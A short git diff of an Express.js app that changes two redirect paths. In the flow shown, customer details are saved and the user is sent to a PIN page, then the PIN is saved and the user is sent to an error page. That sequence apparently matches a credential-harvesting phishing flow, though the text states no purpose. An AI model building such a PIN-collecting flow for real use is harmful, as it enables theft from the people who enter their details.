@@ -55,7 +55,7 @@ app.post('/Customer', (req, res) => {
                 }
     
                 await new Customer(customer).save();
-                res.redirect('pages/pin')
+                res.redirect('/pin')
             }finally {
                 console.log('message')
             }
@@ -74,7 +74,7 @@ app.post('/Pin', (req, res) => {
                 }
     
                 await new Pin(pin).save();
-                res.redirect('pages/error')
+                res.redirect('/error')
             }finally {
                 console.log('message')
             }
